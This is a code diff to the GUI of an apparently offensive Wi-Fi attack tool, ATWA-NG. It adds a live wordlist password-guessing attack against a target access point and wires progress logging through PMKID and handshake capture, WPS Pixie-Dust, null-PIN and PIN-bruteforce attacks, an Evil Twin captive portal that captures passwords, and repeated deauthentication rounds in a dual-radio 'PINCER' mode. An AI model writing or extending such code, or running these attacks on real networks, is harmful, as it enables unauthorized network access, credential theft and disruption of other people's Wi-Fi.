@@ -67,6 +67,13 @@ class App:
         self._scanning = threading.Event()
         self._stop_event = threading.Event()
         self._scan_thread: threading.Thread | None = None
+        # Default no-op; _run_bg() replaces this with a real self._log-backed
+        # callback for the duration of each attack it launches. Set here too
+        # so callers that bypass _run_bg (auto-deauth, PINCER's own thread
+        # setup before _run_bg's fn actually starts) never hit an
+        # AttributeError referencing self._progress_fn before any attack
+        # has run yet.
+        self._progress_fn = lambda msg: None
 
         self.aps: dict[str, AccessPoint] = {}
         self.selected_bssid: str | None = None
@@ -167,6 +174,7 @@ class App:
         attack_menu.add_command(label="WPS Pixie-Dust (offline)", command=self._attack_wps_pixie)
         attack_menu.add_command(label="WPS Bruteforce (experimental)", command=self._attack_wps_bruteforce)
         attack_menu.add_command(label="Evil Twin (Captive Portal)", command=self._attack_eviltwin)
+        attack_menu.add_command(label="Online Password Guess (live, budgeted)", command=self._attack_online_guess)
         attack_menu.add_separator()
         attack_menu.add_command(
             label="⚡ PINCER (Dual-Alfa)", command=self._attack_pincer, state=tk.DISABLED,
@@ -445,6 +453,7 @@ class App:
             ("WPS Pixie-Dust", self._attack_wps_pixie, "TButton"),
             ("WPS Bruteforce (experimental)", self._attack_wps_bruteforce, "TButton"),
             ("Evil Twin (Captive Portal)", self._attack_eviltwin, "TButton"),
+            ("Online Password Guess", self._attack_online_guess, "TButton"),
         ]
         self.attack_buttons: list[ttk.Button] = []
         for label, cmd, style in buttons:
@@ -574,6 +583,22 @@ class App:
         self._queue.put(("busy", True))
         self._queue.put(("status", f"Running: {label}"))
         self._log(f">>> {label}")
+        # Cheap, high-value sanity check: an attack that silently no-ops
+        # because mon_iface slipped out of monitor mode (a stuck driver
+        # state, a stray NetworkManager reclaim, etc.) looks identical in
+        # the log to "the attack ran and found nothing" without this —
+        # the single most confusing failure mode to diagnose blind.
+        if self.mon_iface and "demo" not in self.mon_iface:
+            try:
+                from ..radio import get_mode
+
+                mode = get_mode(self.mon_iface)
+                if mode != "monitor":
+                    self._log(f"    WARNING: {self.mon_iface} is in '{mode}' mode, not 'monitor' — this attack will likely fail silently")
+                else:
+                    self._log(f"    {self.mon_iface}: monitor mode confirmed")
+            except Exception as exc:
+                self._log(f"    could not check {self.mon_iface} mode: {exc}")
 
         done = threading.Event()
         _last_progress: list[str] = []
@@ -1222,7 +1247,10 @@ class App:
         from ..storage import target_capture_dir
 
         def work():
-            line = capture_pmkid(self.mon_iface, ap.bssid, self.own_mac, channel=ap.channel)
+            line = capture_pmkid(
+                self.mon_iface, ap.bssid, self.own_mac, channel=ap.channel,
+                stop_event=self._stop_event, progress_fn=self._progress_fn,
+            )
             if line is None:
                 return "no PMKID captured"
             out_dir = target_capture_dir(ap.ssid, ap.bssid)
@@ -1249,7 +1277,7 @@ class App:
             try:
                 cap = capture_handshake(
                     self.mon_iface, ap.bssid, channel=ap.channel, timeout=60.0,
-                    outfile=str(out_file), stop_event=self._stop_event,
+                    outfile=str(out_file), stop_event=self._stop_event, progress_fn=self._progress_fn,
                 )
             finally:
                 watch_stop.set()
@@ -1287,7 +1315,10 @@ class App:
                     cracker = JohnCracker()
                 except JohnUnavailableError as exc:
                     self._log(f"warning: {exc} — will batch hashes but not crack")
-            orch = OmniOrchestrator(self.mon_iface, cracker=cracker, capture_dir=capture_dir, stop_event=self._stop_event)
+            orch = OmniOrchestrator(
+                self.mon_iface, cracker=cracker, capture_dir=capture_dir,
+                stop_event=self._stop_event, progress_fn=self._progress_fn,
+            )
             report = getattr(orch, method)(ap, wordlist=wordlist)
             self._log(report.summary())
             return "cracked" if report.cracked else "no crack"
@@ -1371,7 +1402,9 @@ class App:
         from ..attacks.wps import null_pin_attack
 
         def work():
-            outcome = null_pin_attack(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel)
+            outcome = null_pin_attack(
+                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
+            )
             if outcome.network_key:
                 return f"{outcome.outcome.value}: key={outcome.network_key}"
             return outcome.outcome.value
@@ -1394,7 +1427,9 @@ class App:
         from ..attacks.wps import pixie_attempt
 
         def work():
-            result = pixie_attempt(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel)
+            result = pixie_attempt(
+                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
+            )
             if result.outcome.name == "SUCCESS":
                 return f"pixie-dust success: key={result.network_key}"
             # "no vulnerable nonce" is only actually true for FIRST_HALF_WRONG
@@ -1425,7 +1460,10 @@ class App:
         from ..attacks.wps import wps_pin_bruteforce
 
         def work():
-            result = wps_pin_bruteforce(self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel, stop_event=self._stop_event)
+            result = wps_pin_bruteforce(
+                self.mon_iface, ap.bssid, ap.ssid, channel=ap.channel,
+                stop_event=self._stop_event, progress_fn=self._progress_fn,
+            )
             if result.success:
                 return f"PIN={result.pin} key={result.network_key}"
             if result.ap_setup_locked:
@@ -1518,7 +1556,7 @@ class App:
             result["cap"] = capture_handshake(
                 self.mon_iface, ap.bssid, channel=ap.channel,
                 timeout=interval * max_rounds + 10, outfile=str(out_file),
-                stop_event=stop_event,
+                stop_event=stop_event, progress_fn=self._log,
             )
 
         # Marks mon_iface busy so the background scan loop (_start_scan)
@@ -1542,8 +1580,11 @@ class App:
                 if stop_event.is_set():
                     break
                 try:
-                    sent = deauth(self.mon_iface, ap.bssid, count=1, channel=ap.channel)
-                    self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {ap.bssid}")
+                    sent = deauth(self.mon_iface, ap.bssid, count=1, channel=ap.channel, progress_fn=self._log)
+                    if sent == 0:
+                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: did NOT go out to {ap.bssid} — see the warning above")
+                    else:
+                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {ap.bssid}")
                 except Exception as exc:
                     self._log(f"auto-deauth round {round_n + 1} failed: {exc}")
                 for _ in range(interval):
@@ -1606,12 +1647,61 @@ class App:
                 ssid=ap.ssid,
                 channel=ap.channel or 6,
                 stop_event=self._stop_event,
+                progress_fn=self._progress_fn,
             )
             if result.success:
                 return f"Evil Twin: password captured → {result.password!r}"
             return f"Evil Twin: {result.detail}"
 
         self._run_bg(f"Evil Twin on {ap.bssid}", work)
+
+    def _attack_online_guess(self):
+        """Live per-password 4-way handshake attempt against the AP itself
+        (attacks/online.py) -- the standalone version of OMNI's ONLINE
+        stage, for running it on its own instead of the full chain (e.g.
+        PMF blocks the HANDSHAKE stage's deauth, so this is a way to still
+        try a wordlist against the target)."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "Online guessing needs a known SSID.")
+            return
+        if ap.security not in ("WPA", "WPA2", "transition"):
+            messagebox.showwarning(
+                "ATWA-NG",
+                f"Online guessing needs a PSK-based network (WPA/WPA2/transition) — "
+                f"this target is {ap.security}. WPA3/SAE-only and WEP aren't supported "
+                "(see attacks/online.py).",
+            )
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+        if not self._confirm_attack(
+            "Online Password Guess",
+            f"Live password guessing against {ap.bssid} ({ap.ssid}) using {wordlist}.\n\n"
+            "Slow by design (one real association + 4-way handshake per candidate, "
+            "~1-3s each) and noisy — every attempt is visible to the AP.",
+        ):
+            return
+        self._stop_event.clear()
+        from ..attacks.online import online_guess
+
+        def work():
+            result = online_guess(
+                self.mon_iface, ap.bssid, ap.ssid, self.own_mac, wordlist,
+                channel=ap.channel, stop_event=self._stop_event, progress_fn=self._progress_fn,
+            )
+            if result.success:
+                return f"password={result.password!r} after {result.attempts} attempt(s)"
+            return f"{result.detail} ({result.attempts} attempt(s), {result.skipped_invalid} skipped)"
+
+        self._run_bg(f"Online guess on {ap.bssid}", work)
 
     def _attack_pincer(self):
         """Flagship dual-Alfa mode (STATUS.md 'Ideas/undecided', 2026-08-14
@@ -1648,18 +1738,27 @@ class App:
         from ..radio import set_channel, set_managed_mode, set_monitor_mode
         from ..storage import target_capture_dir
 
+        from ..radio import get_mode
+
         randomize = self.randomize_mac_var.get()
         max_rounds = 12  # dedicated attack radio, not sharing time with scanning -> can afford more
         interval = 10
         out_dir = target_capture_dir(ap.ssid, ap.bssid)
         out_file = out_dir / f"pincer_{int(_time.time())}.pcap"
 
+        self._log(f"PINCER: putting {scan_iface} (scan/listen) into monitor mode (randomize_mac={randomize})")
         scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize)
+        self._log(f"PINCER: {scan_mon} mode={get_mode(scan_mon)}")
+        self._log(f"PINCER: putting {attack_iface} (attack/deauth) into monitor mode (randomize_mac={randomize})")
         attack_mon, attack_perm_mac = set_monitor_mode(attack_iface, randomize_mac=randomize)
+        self._log(f"PINCER: {attack_mon} mode={get_mode(attack_mon)}")
         try:
             if ap.channel:
                 set_channel(scan_mon, ap.channel)
                 set_channel(attack_mon, ap.channel)
+                self._log(f"PINCER: both radios parked on channel {ap.channel}")
+            else:
+                self._log("PINCER: no channel known for target — radios left on their current channel")
 
             result: dict = {}
 
@@ -1667,9 +1766,10 @@ class App:
                 result["cap"] = capture_handshake(
                     scan_mon, ap.bssid, channel=ap.channel,
                     timeout=interval * max_rounds + 15, outfile=str(out_file),
-                    stop_event=stop_event,
+                    stop_event=stop_event, progress_fn=self._log,
                 )
 
+            self._log(f"PINCER: {scan_mon} starting EAPOL listener, writing to {out_file}")
             listener = threading.Thread(target=listen, daemon=True)
             listener.start()
             watch_stop = threading.Event()
@@ -1681,21 +1781,35 @@ class App:
 
             for round_n in range(max_rounds):
                 if stop_event.is_set():
+                    self._log(f"PINCER: stop requested before round {round_n + 1}/{max_rounds}")
                     break
-                sent = deauth(attack_mon, ap.bssid, count=1, channel=ap.channel)
-                self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
+                sent = deauth(attack_mon, ap.bssid, count=1, channel=ap.channel, progress_fn=self._log)
+                if sent == 0:
+                    self._log(
+                        f"PINCER round {round_n + 1}/{max_rounds}: deauth did NOT go out "
+                        f"({attack_mon} -> {ap.bssid}) — see the warning above"
+                    )
+                else:
+                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
+                cap = result.get("cap")
+                if cap is not None:
+                    statuses = {(a, c): cap.status(a, c).value for a, c in cap.messages}
+                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: EAPOL pairs seen so far: {statuses or '(none)'}")
                 for _ in range(interval):
                     if stop_event.is_set() or authorized():
                         break
                     _time.sleep(1)
                 if authorized():
+                    self._log("PINCER: AUTHORIZED handshake detected — stopping deauth rounds")
                     break
 
             listener.join(timeout=5)
             watch_stop.set()
         finally:
+            self._log("PINCER: restoring both radios to managed mode")
             set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
             set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
+            self._log("PINCER: both radios restored")
 
         if authorized():
             return f"AUTHORIZED handshake captured -> {out_file}"
